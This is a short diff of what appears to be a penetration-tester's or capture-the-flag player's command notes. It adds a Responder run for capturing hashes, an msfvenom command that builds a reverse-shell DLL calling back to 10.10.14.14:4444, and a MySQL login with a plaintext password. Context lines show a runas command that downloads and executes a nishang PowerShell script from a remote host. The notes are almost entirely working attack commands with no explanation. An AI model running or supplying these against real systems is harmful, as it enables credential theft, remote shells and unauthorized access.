@@ -86,3 +86,27 @@ cmdkey /list
 runas /user:Administrator /savecred "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.13:8000/nishang2.ps1')"
 
 whoami /prev
+
+
+
+sudo responder -wrf --lm -v -I tun0 
+
+
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f dll -o ./evil.dll
+
+
+
+mysql -u admin -h localhost --password=kEjdbRigfBHUREiNSDs -D admin
+
+
+
+
+
+
+
+
+
+
+
+
+
